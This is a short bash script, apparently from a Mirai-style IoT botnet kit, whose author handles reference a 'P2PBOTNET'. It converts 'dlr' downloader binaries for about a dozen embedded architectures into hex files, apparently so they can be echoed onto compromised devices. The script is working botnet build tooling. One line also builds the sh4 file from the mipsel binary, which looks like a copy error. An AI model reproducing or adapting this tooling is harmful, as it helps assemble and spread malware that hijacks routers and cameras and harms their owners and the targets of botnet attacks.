#!/bin/bash
#Made By: ~B1NARY~
#Made Date: 7-27-18
#Instagram: @botkillerzondeck
#Twitter: @P2PBOTNET
yum install zip -y;apt-get install zip -y
mkdir hex
./convert release/dlr.mips >> hex/dlrmips.hex
./convert release/dlr.mipsel >> hex/dlrmipsel.hex
./convert release/dlr.mipsel >> hex/dlrsh4.hex
./convert release/dlr.x86_64 >> hex/dlrx86_64.hex
./convert release/dlr.armv6l >> hex/dlrarmv6l.hex
./convert release/dlr.i686 >> hex/dlri686.hex
./convert release/dlr.powerpc >> hex/dlrpowerpc.hex
./convert release/dlr.i586 >> hex/dlri586.hex
./convert release/dlr.m68k >> hex/dlrm68k.hex
./convert release/dlr.sparc >> hex/dlrsparc.hex
./convert release/dlr.armv4l >> hex/dlrarmv4l.hex
./convert release/dlr.armv5l >> hex/dlrarmv5l.hex
./convert release/dlr.powerpc440fp >> hex/dlrpowerpc440fp.hex